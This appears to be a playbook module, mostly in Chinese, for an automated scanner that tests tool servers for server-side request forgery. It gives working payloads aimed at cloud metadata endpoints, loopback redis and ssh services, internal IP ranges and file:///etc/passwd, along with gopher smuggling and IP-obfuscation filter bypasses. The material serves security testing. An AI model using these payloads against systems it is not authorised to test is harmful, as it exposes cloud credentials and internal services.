# ssrf

## When to use
Tool 名/描述含 `fetch` `http` `url` `webhook` `callback` `request` `scrape`
`proxy`, 或 schema 有 `url` / `uri` / `endpoint` / `webhook` / `target` 这类
「server 侧代发请求」参数。核心特征: **server 替攻击者访问 URL 并把响应带回**。

## Objective
让 server 代访**本不该访问的内部目标**: 云元数据 (AWS/GCP/Aliyun IMDS)、本机
回环服务 (ssh/redis/mongo/nginx)、`file://` 本地文件。判据:
- `ssrf_cloud_metadata` (high): 响应含 `ami-id` / `instance-id` / `local-ipv4` /
  `security-credentials`
- `ssrf_internal_service` (high): 响应含内部 banner (SSH-2.0 / Redis / MongoDB /
  nginx / IIS)
- 交叉 `leaks_*`: `file://` 或内网读取带回敏感内容
> 与 path_traversal 的区别: 那个打文件路径参数, 这个打代发请求的 URL 参数;
> `file://` 两者叠加。

## Playbook
1. `list_tools` 找出接受 URL/endpoint/webhook 参数的 tool, 读 schema。
2. 良性目标 (`http://example.com`) 确认 server 真代发并带回响应 (只确认攻击面)。
3. 回环/内网: `127.0.0.1:22` / `localhost:6379` / `10.0.0.1` / `192.168.1.1`,
   出 banner 即命中 `ssrf_internal_service`。
4. 云元数据: AWS `169.254.169.254` / GCP `metadata.google.internal` / Aliyun
   `100.100.100.200`, 出 `ami-id` 等键即命中 `ssrf_cloud_metadata`。
5. 协议走私: `file:///etc/passwd`、`gopher://127.0.0.1:6379/_...` → `leaks_*`。
6. 有 scheme/IP 过滤再试: 301 重定向到内网、`@` 混淆、十六进制/十进制 IP、
   IPv6 回环、DNS rebinding。
7. 任一 high 命中即收, 不做完整内网枚举。

## Templates
- `{"url": "http://example.com"}`  # 良性确认 server 代发请求
- `{"url": "http://127.0.0.1:22/"}`  # 回环 ssh banner
- `{"url": "http://localhost:6379/"}`  # redis banner / ERR unknown command
- `{"url": "http://10.0.0.1/"}`  # 内网探测
- `{"url": "http://169.254.169.254/latest/meta-data/"}`  # AWS IMDS
- `{"url": "http://metadata.google.internal/computeMetadata/v1/"}`  # GCP
- `{"url": "http://100.100.100.200/latest/meta-data/"}`  # Aliyun
- `{"url": "file:///etc/passwd"}`  # 协议走私, 交叉触发 leaks_*
- `{"url": "http://0x7f000001/"}`  # 十六进制 IP 绕过
- `{"url": "http://[::1]:22/"}`  # IPv6 回环
